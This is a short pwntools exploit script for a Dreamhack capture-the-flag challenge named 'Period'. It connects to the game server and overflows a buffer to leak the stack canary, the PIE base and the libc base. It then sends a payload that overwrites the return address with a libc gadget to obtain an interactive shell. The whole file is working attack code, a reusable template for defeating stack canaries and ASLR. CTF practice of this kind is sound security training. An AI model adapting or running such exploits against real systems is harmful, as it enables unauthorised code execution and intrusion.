from pwn import *

port = 14156
rem = remote("host3.dreamhack.games", port)

elf = ELF("./Pwnable/Period/problem/deploy/prob")
lib = ELF("./Pwnable/Period/problem/deploy/libc.so.6") # got it from Dockerfile

payload = b"A" * 256
rem.sendafter(b"> ", b"2.")
rem.recvline()
rem.send(payload)

rem.sendafter(b"> ", b"1.")
rem.recvuntil(payload)
rem.recvn(8)
canary = u64(rem.recvn(8))
rem.recvn(8)
pie_base = u64(rem.recvn(8)) - elf.symbols['main'] - 18
rem.recvn(8)
lib_base = u64(rem.recvn(8)) - 128 + 0xb0 - lib.symbols["__libc_start_main"]
pop_rax = lib_base + 0x45eb0
sys_addr = lib_base + 0xebdb3

rem.recvuntil(b"> ")
payload = b"B" * 0x18
payload += p64(canary)
payload += p64(pie_base + elf.bss() + 0x200)
payload += p64(sys_addr)
payload += b"."
rem.send(payload)

rem.interactive()